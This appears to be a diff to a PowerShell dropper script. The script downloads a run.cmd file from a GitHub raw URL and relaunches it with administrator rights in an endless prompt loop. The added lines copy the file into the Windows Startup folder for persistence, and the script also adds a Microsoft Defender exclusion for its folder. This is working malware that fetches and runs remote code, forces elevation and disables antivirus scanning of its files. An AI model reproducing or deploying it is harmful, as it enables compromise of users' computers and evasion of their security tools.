@@ -6,10 +6,16 @@ $temp = "$dir\temp"
 New-Item -ItemType Directory -Path $temp
 
 Invoke-WebRequest -Uri "https://raw.githubusercontent.com/43a1723/test/main/run.cmd" -OutFile "$temp\run.cmd"
+$startupFolder = [System.IO.Path]::Combine($env:APPDATA, "Microsoft\Windows\Start Menu\Programs\Startup")
 
 if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
+    $sourceFile = "$temp\run.cmd"
+    Copy-Item -Path $sourceFile -Destination $startupFolder -Force
     while(1){try{Start-Process -Verb RunAs -FilePath '$temp\run.cmd';exit}catch{}}
 }
+
+$destinationFile = [System.IO.Path]::Combine($startupFolder, "run.cmd")
+Remove-Item -Path $destinationFile -Force
 
 Add-MpPreference -ExclusionPath $dir
 
